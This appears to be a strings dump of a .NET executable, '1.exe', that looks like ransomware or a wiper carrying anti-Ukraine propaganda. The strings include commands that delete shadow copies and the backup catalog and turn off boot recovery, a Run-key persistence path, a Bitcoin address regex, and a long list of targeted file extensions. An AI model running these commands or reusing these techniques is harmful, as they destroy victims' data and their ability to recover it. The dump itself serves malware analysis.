Metadata Signature: 0x1d50 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: ac4
Stream name: #~ 4
DirectoryAddress: b30 Size: e5c
Stream name: #Strings 12
DirectoryAddress: 198c Size: 1408
Stream name: #US 4
DirectoryAddress: 2d94 Size: 10
Stream name: #GUID 8
DirectoryAddress: 2da4 Size: 35c
Stream name: #Blob 8
[Strings]
nth paddr      vaddr      len size section type    string
385 0x00003c0f 0x00405a0f 7   15   .text   utf16le \Videos
386 0x00003c23 0x00405a23 5   11   .text   utf16le runas
387 0x00003c2f 0x00405a2f 4   9    .text   utf16le .url
388 0x00003c39 0x00405a39 18  37   .text   utf16le [InternetShortcut]
389 0x00003c5f 0x00405a5f 12  25   .text   utf16le URL=file:///
390 0x00003c79 0x00405a79 11  23   .text   utf16le IconIndex=0
391 0x00003c91 0x00405a91 9   19   .text   utf16le IconFile=
392 0x00003ca5 0x00405aa5 45  91   .text   utf16le SOFTWARE\Microsoft\Windows\CurrentVersion\Run
393 0x00003d01 0x00405b01 15  31   .text   utf16le Microsoft Store
394 0x00003d21 0x00405b21 7   15   .text   utf16le cmd.exe
395 0x00003d39 0x00405b39 60  121  .text   utf16le vssadmin delete shadows /all /quiet & wmic shadowcopy delete
396 0x00003db4 0x00405bb4 101 203  .text   utf16le bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
397 0x00003e80 0x00405c80 29  59   .text   utf16le wbadmin delete catalog -quiet
398 0x00003ebc 0x00405cbc 4   9    .text   utf16le .jpg
399 0x00003ec6 0x00405cc6 9   19   .text   utf16le C:\Users\
400 0x00003eda 0x00405cda 21  43   .text   utf16le 7z459ajrk722yn8c5j4fg
401 0x00003f06 0x00405d06 8   17   .text   utf16le fuckazov
402 0x00003f18 0x00405d18 8   17   .text   utf16le surprise
403 0x00003f2a 0x00405d2a 11  24   .text   utf16le svchost.exe
404 0x00003f42 0x00405d42 19  39   .text   utf16le 2X28tfRmWaPyPQgvoHV
405 0x00003f6a 0x00405d6a 12  26   .text   utf16le #base64Image
406 0x00003f84 0x00405d84 19  40   .text   utf16le 1qw0ll8p9m8uezhqhyd
407 0x00003fac 0x00405dac 19  39   .text   utf16le stop_propaganda.txt
408 0x00003fd4 0x00405dd4 15  31   .text   utf16le 17CqMQFeuB3NTzJ
409 0x00003ffa 0x00405dfa 57  115  .text   utf16le (?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})
410 0x0000406e 0x00405e6e 63  127  .text   utf16le Stop Ukraine War! Fuck Zelensky! Dont go die for fucking clown!
411 0x000040ee 0x00405eee 27  55   .text   utf16le You can see the truth here:
412 0x00004126 0x00405f26 15  31   .text   utf16le t.me/infoccentr
413 0x00004146 0x00405f46 14  29   .text   utf16le infoccenter.ru
414 0x00004164 0x00405f64 4   9    .text   utf16le .txt
415 0x0000416e 0x00405f6e 4   9    .text   utf16le .jar
416 0x00004178 0x00405f78 4   9    .text   utf16le .dat
417 0x00004182 0x00405f82 8   17   .text   utf16le .contact
418 0x00004194 0x00405f94 9   19   .text   utf16le .settings
419 0x000041a8 0x00405fa8 4   10   .text   utf16le .doc
420 0x000041b2 0x00405fb2 5   11   .text   utf16le .docx
421 0x000041be 0x00405fbe 4   10   .text   utf16le .xls
422 0x000041c8 0x00405fc8 5   11   .text   utf16le .xlsx
423 0x000041d4 0x00405fd4 4   10   .text   utf16le .ppt
424 0x000041de 0x00405fde 5   11   .text   utf16le .pptx
425 0x000041ea 0x00405fea 4   9    .text   utf16le .odt
426 0x000041f4 0x00405ff4 4   10   .text   utf16le .mka
427 0x000041fe 0x00405ffe 6   13   .text   utf16le .mhtml
428 0x0000420c 0x0040600c 4   9    .text   utf16le .oqy
429 0x00004216 0x00406016 4   9    .text   utf16le .png
430 0x00004220 0x00406020 4   9    .text   utf16le .csv
431 0x00004232 0x00406032 4   9    .text   utf16le .sql
432 0x0000423c 0x0040603c 4   9    .text   utf16le .mdb
433 0x00004246 0x00406046 4   9    .text   utf16le .php
434 0x00004250 0x00406050 4   10   .text   utf16le .asp
435 0x0000425a 0x0040605a 5   12   .text   utf16le .aspx
436 0x00004266 0x00406066 5   11   .text   utf16le .html
437 0x00004272 0x00406072 4   9    .text   utf16le .htm
438 0x0000427c 0x0040607c 4   9    .text   utf16le .xml
439 0x00004286 0x00406086 4   9    .text   utf16le .psd
440 0x00004290 0x00406090 4   9    .text   utf16le .pdf
441 0x0000429a 0x0040609a 4   9    .text   utf16le .xla
442 0x000042a4 0x004060a4 4   9    .text   utf16le .cub
443 0x000042ae 0x004060ae 4   10   .text   utf16le .dae
444 0x000042b8 0x004060b8 5   11   .text   utf16le .indd
445 0x000042cc 0x004060cc 4   9    .text   utf16le .mp3
446 0x000042d6 0x004060d6 4   9    .text   utf16le .mp4
447 0x000042e0 0x004060e0 4   9    .text   utf16le .dwg
448 0x000042ea 0x004060ea 4   9    .text   utf16le .zip
449 0x000042f4 0x004060f4 4   9    .text   utf16le .rar
450 0x000042fe 0x004060fe 4   9    .text   utf16le .mov
451 0x00004308 0x00406108 4   9    .text   utf16le .rtf
452 0x00004312 0x00406112 4   9    .text   utf16le .bmp
453 0x0000431c 0x0040611c 4   9    .text   utf16le .mkv
454 0x00004326 0x00406126 4   9    .text   utf16le .avi
455 0x00004330 0x00406130 4   9    .text   utf16le .apk
456 0x0000433a 0x0040613a 4   9    .text   utf16le .lnk
457 0x00004344 0x00406144 4   9    .text   utf16le .dib
458 0x0000434e 0x0040614e 4   9    .text   utf16le .dic
459 0x00004358 0x00406158 4   10   .text   utf16le .dif
460 0x00004362 0x00406162 5   11   .text   utf16le .divx
461 0x0000436e 0x0040616e 4   10   .text   utf16le .iso
462 0x00004378 0x00406178 5   11   .text   utf16le .7zip
463 0x00004384 0x00406184 4   9    .text   utf16le .ace
464 0x0000438e 0x0040618e 4   9    .text   utf16le .arj
465 0x00004398 0x00406198 4   9    .text   utf16le .bz2
466 0x000043a2 0x004061a2 4   10   .text   utf16le .cab
467 0x000043ac 0x004061ac 5   11   .text   utf16le .gzip
468 0x000043b8 0x004061b8 4   9    .text   utf16le .lzh
469 0x000043c2 0x004061c2 4   10   .text   utf16le .tar
470 0x000043cc 0x004061cc 5   11   .text   utf16le .jpeg
471 0x000043e0 0x004061e0 5   11   .text   utf16le .mpeg
472 0x000043ec 0x004061ec 8   17   .text   utf16le .torrent
473 0x000043fe 0x004061fe 4   10   .text   utf16le .mpg
474 0x00004408 0x00406208 5   11   .text   utf16le .core
475 0x00004414 0x00406214 4   9    .text   utf16le .pdb
476 0x0000441e 0x0040621e 4   9    .text   utf16le .ico
477 0x00004428 0x00406228 4   9    .text   utf16le .pas
478 0x0000443a 0x0040623a 4   9    .text   utf16le .wmv
479 0x00004444 0x00406244 4   9    .text   utf16le .swf
480 0x0000444e 0x0040624e 4   9    .text   utf16le .cer
481 0x00004458 0x00406258 4   9    .text   utf16le .bak
482 0x00004462 0x00406262 7   16   .text   utf16le .backup
483 0x00004472 0x00406272 6   13   .text   utf16le .accdb
484 0x00004480 0x00406280 4   9    .text   utf16le .bay
485 0x0000448a 0x0040628a 4   10   .text   utf16le .p7c
486 0x00004494 0x00406294 5   11   .text   utf16le .exif
487 0x000044a0 0x004062a0 4   9    .text   utf16le .vss
488 0x000044aa 0x004062aa 4   9    .text   utf16le .raw
489 0x000044b4 0x004062b4 4   9    .text   utf16le .m4a
490 0x000044be 0x004062be 4   9    .text   utf16le .wma
491 0x000044c8 0x004062c8 4   9    .text   utf16le .flv
492 0x000044d2 0x004062d2 4   9    .text   utf16le .sie
493 0x000044dc 0x004062dc 4   10   .text   utf16le .sum
494 0x000044e6 0x004062e6 6   13   .text   utf16le .ibank
495 0x000044f4 0x004062f4 7   15   .text   utf16le .wallet
496 0x00004504 0x00406304 4   9    .text   utf16le .css
497 0x0000451e 0x0040631e 4   10   .text   utf16le .crt
498 0x00004528 0x00406328 5   12   .text   utf16le .xlsm
499 0x00004534 0x00406334 5   11   .text   utf16le .xlsb
500 0x00004548 0x00406348 4   10   .text   utf16le .cpp
501 0x00004552 0x00406352 5   11   .text   utf16le .java
502 0x0000455e 0x0040635e 4   9    .text   utf16le .jpe
503 0x00004568 0x00406368 4   10   .text   utf16le .ini
504 0x00004572 0x00406372 5   11   .text   utf16le .blob
505 0x0000457e 0x0040637e 4   10   .text   utf16le .wps
506 0x00004588 0x00406388 5   11   .text   utf16le .docm
507 0x00004594 0x00406394 4   9    .text   utf16le .wav
508 0x0000459e 0x0040639e 4   10   .text   utf16le .3gp
509 0x000045a8 0x004063a8 5   11   .text   utf16le .webm
510 0x000045b4 0x004063b4 4   9    .text   utf16le .m4v
511 0x000045be 0x004063be 4   9    .text   utf16le .amv
512 0x000045c8 0x004063c8 4   9    .text   utf16le .m4p
513 0x000045d2 0x004063d2 4   9    .text   utf16le .svg
514 0x000045dc 0x004063dc 4   9    .text   utf16le .ods
515 0x000045ee 0x004063ee 4   10   .text   utf16le .vdi
516 0x000045f8 0x004063f8 5   11   .text   utf16le .vmdk
517 0x00004604 0x00406404 7   16   .text   utf16le .onepkg
518 0x00004614 0x00406414 6   13   .text   utf16le .accde
519 0x00004622 0x00406422 4   10   .text   utf16le .jsp
520 0x0000462c 0x0040642c 5   11   .text   utf16le .json
521 0x00004638 0x00406438 4   9    .text   utf16le .gif
522 0x00004642 0x00406442 4   9    .text   utf16le .log
523 0x00004654 0x00406454 7   15   .text   utf16le .config
524 0x0000466c 0x0040646c 4   9    .text   utf16le .m1v
525 0x00004676 0x00406476 4   9    .text   utf16le .sln
526 0x00004680 0x00406480 4   9    .text   utf16le .pst
527 0x0000468a 0x0040648a 4   10   .text   utf16le .obj
528 0x00004694 0x00406494 5   12   .text   utf16le .xlam
529 0x000046a0 0x004064a0 5   11   .text   utf16le .djvu
530 0x000046ac 0x004064ac 4   9    .text   utf16le .inc
531 0x000046b6 0x004064b6 4   9    .text   utf16le .cvs
532 0x000046c0 0x004064c0 4   9    .text   utf16le .dbf
533 0x000046ca 0x004064ca 4   9    .text   utf16le .tbi
534 0x000046d4 0x004064d4 4   9    .text   utf16le .wpd
535 0x000046de 0x004064de 4   10   .text   utf16le .dot
536 0x000046e8 0x004064e8 5   12   .text   utf16le .dotx
537 0x000046f4 0x004064f4 5   12   .text   utf16le .xltx
538 0x00004700 0x00406500 5   12   .text   utf16le .pptm
539 0x0000470c 0x0040650c 5   12   .text   utf16le .potx
540 0x00004718 0x00406518 5   11   .text   utf16le .potm
541 0x00004724 0x00406524 4   9    .text   utf16le .pot
542 0x0000472e 0x0040652e 4   9    .text   utf16le .xlw
543 0x00004738 0x00406538 4   9    .text   utf16le .xps
544 0x00004742 0x00406542 4   9    .text   utf16le .xsd
545 0x0000474c 0x0040654c 4   9    .text   utf16le .xsf
546 0x00004756 0x00406556 4   9    .text   utf16le .xsl
547 0x00004760 0x00406560 4   10   .text   utf16le .kmz
548 0x0000476a 0x0040656a 6   13   .text   utf16le .accdr
549 0x00004778 0x00406578 4   10   .text   utf16le .stm
550 0x00004782 0x00406582 6   14   .text   utf16le .accdt
551 0x00004790 0x00406590 5   11   .text   utf16le .ppam
552 0x0000479c 0x0040659c 4   10   .text   utf16le .pps
553 0x000047a6 0x004065a6 5   11   .text   utf16le .ppsm
554 0x000047b2 0x004065b2 4   9    .text   utf16le .1cd
555 0x000047bc 0x004065bc 4   9    .text   utf16le .3ds
556 0x000047c6 0x004065c6 4   9    .text   utf16le .3fr
557 0x000047d0 0x004065d0 4   10   .text   utf16le .3g2
558 0x000047da 0x004065da 6   14   .text   utf16le .accda
559 0x000047e8 0x004065e8 6   14   .text   utf16le .accdc
560 0x000047f6 0x004065f6 6   13   .text   utf16le .accdw
561 0x00004804 0x00406604 4   9    .text   utf16le .adp
562 0x00004816 0x00406616 4   9    .text   utf16le .ai3
563 0x00004820 0x00406620 4   9    .text   utf16le .ai4
564 0x0000482a 0x0040662a 4   9    .text   utf16le .ai5
565 0x00004834 0x00406634 4   9    .text   utf16le .ai6
566 0x0000483e 0x0040663e 4   9    .text   utf16le .ai7
567 0x00004848 0x00406648 4   9    .text   utf16le .ai8
568 0x00004852 0x00406652 4   10   .text   utf16le .arw
569 0x0000485c 0x0040665c 5   11   .text   utf16le .ascx
570 0x00004868 0x00406668 4   10   .text   utf16le .asm
571 0x00004872 0x00406672 5   11   .text   utf16le .asmx
572 0x0000487e 0x0040667e 4   9    .text   utf16le .avs
573 0x00004888 0x00406688 4   9    .text   utf16le .bin
574 0x00004892 0x00406692 4   9    .text   utf16le .cfm
575 0x0000489c 0x0040669c 4   9    .text   utf16le .dbx
576 0x000048a6 0x004066a6 4   9    .text   utf16le .dcm
577 0x000048b0 0x004066b0 4   10   .text   utf16le .dcr
578 0x000048ba 0x004066ba 5   12   .text   utf16le .pict
579 0x000048c6 0x004066c6 5   11   .text   utf16le .rgbe
580 0x000048d2 0x004066d2 4   9    .text   utf16le .dwt
581 0x000048dc 0x004066dc 4   9    .text   utf16le .f4v
582 0x000048e6 0x004066e6 4   9    .text   utf16le .exr
583 0x000048f0 0x004066f0 4   9    .text   utf16le .kwm
584 0x000048fa 0x004066fa 4   9    .text   utf16le .max
585 0x00004904 0x00406704 4   9    .text   utf16le .mda
586 0x0000490e 0x0040670e 4   9    .text   utf16le .mde
587 0x00004918 0x00406718 4   9    .text   utf16le .mdf
588 0x00004922 0x00406722 4   9    .text   utf16le .mdw
589 0x0000492c 0x0040672c 4   9    .text   utf16le .mht
590 0x00004936 0x00406736 4   9    .text   utf16le .mpv
591 0x00004940 0x00406740 4   9    .text   utf16le .msg
592 0x0000494a 0x0040674a 4   9    .text   utf16le .myi
593 0x00004954 0x00406754 4   9    .text   utf16le .nef
594 0x0000495e 0x0040675e 4   9    .text   utf16le .odc
595 0x00004968 0x00406768 4   10   .text   utf16le .geo
596 0x00004972 0x00406772 6   13   .text   utf16le .swift
597 0x00004980 0x00406780 4   9    .text   utf16le .odm
598 0x0000498a 0x0040678a 4   9    .text   utf16le .odp
599 0x00004994 0x00406794 4   9    .text   utf16le .oft
600 0x0000499e 0x0040679e 4   9    .text   utf16le .orf
601 0x000049a8 0x004067a8 4   9    .text   utf16le .pfx
602 0x000049b2 0x004067b2 4   9    .text   utf16le .p12
603 0x000049c4 0x004067c4 4   10   .text   utf16le .pls
604 0x000049ce 0x004067ce 5   11   .text   utf16le .safe
605 0x000049da 0x004067da 4   9    .text   utf16le .tab
606 0x000049e4 0x004067e4 4   9    .text   utf16le .vbs
607 0x000049ee 0x004067ee 4   9    .text   utf16le .xlk
608 0x000049f8 0x004067f8 4   9    .text   utf16le .xlm
609 0x00004a02 0x00406802 4   10   .text   utf16le .xlt
610 0x00004a0c 0x0040680c 5   12   .text   utf16le .xltm
611 0x00004a18 0x00406818 5   11   .text   utf16le .svgz
612 0x00004a24 0x00406824 4   9    .text   utf16le .slk
613 0x00004a2e 0x0040682e 7   15   .text   utf16le .tar.gz
614 0x00004a3e 0x0040683e 4   9    .text   utf16le .dmg
615 0x00004a50 0x00406850 4   9    .text   utf16le .psb
616 0x00004a5a 0x0040685a 4   9    .text   utf16le .tif
617 0x00004a64 0x00406864 4   9    .text   utf16le .rss
618 0x00004a6e 0x0040686e 4   9    .text   utf16le .key
619 0x00004a78 0x00406878 4   10   .text   utf16le .vob
620 0x00004a82 0x00406882 5   11   .text   utf16le .epsp
621 0x00004a8e 0x0040688e 4   9    .text   utf16le .dc3
622 0x00004a98 0x00406898 4   9    .text   utf16le .iff
623 0x00004aa2 0x004068a2 8   17   .text   utf16le .onetoc2
624 0x00004ab4 0x004068b4 4   9    .text   utf16le .opt
625 0x00004abe 0x004068be 4   9    .text   utf16le .p7b
626 0x00004ac8 0x004068c8 4   9    .text   utf16le .pam
627 0x00004ad2 0x004068d2 4   9    .text   utf16le .r3d
628 0x00004e37 0x00406c37 22  23   .text   ascii   WrapNonExceptionThrows
629 0x00004e82 0x00406c82 11  12   .text   ascii   _CorExeMain
630 0x00004e8e 0x00406c8e 11  12   .text   ascii   mscoree.dll
631 0x000050a6 0x004080a6 15  32   .rsrc   utf16le VS_VERSION_INFO
632 0x00005104 0x00408104 10  22   .rsrc   utf16le arFileInfo
633 0x00005122 0x00408122 11  24   .rsrc   utf16le Translation
634 0x00005146 0x00408146 14  30   .rsrc   utf16le StringFileInfo
635 0x0000516a 0x0040816a 8   18   .rsrc   utf16le 000004b0
636 0x00005182 0x00408182 15  32   .rsrc   utf16le FileDescription
637 0x000051ae 0x004081ae 11  24   .rsrc   utf16le FileVersion
638 0x000051c8 0x004081c8 7   16   .rsrc   utf16le 0.0.0.0
639 0x000051de 0x004081de 12  26   .rsrc   utf16le InternalName
640 0x000051f8 0x004081f8 5   12   .rsrc   utf16le 1.exe
641 0x0000520a 0x0040820a 14  30   .rsrc   utf16le LegalCopyright
642 0x00005232 0x00408232 16  34   .rsrc   utf16le OriginalFilename
643 0x00005254 0x00408254 5   12   .rsrc   utf16le 1.exe
644 0x00005266 0x00408266 14  30   .rsrc   utf16le ProductVersion
645 0x00005284 0x00408284 7   16   .rsrc   utf16le 0.0.0.0
646 0x0000529a 0x0040829a 16  34   .rsrc   utf16le Assembly Version
647 0x000052bc 0x004082bc 7   16   .rsrc   utf16le 0.0.0.0
648 0x000052d3 0x004082d3 487 488  .rsrc   ascii   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">\r\n  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>\r\n  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">\r\n    <security>\r\n      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">\r\n        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n</assembly>\r\n

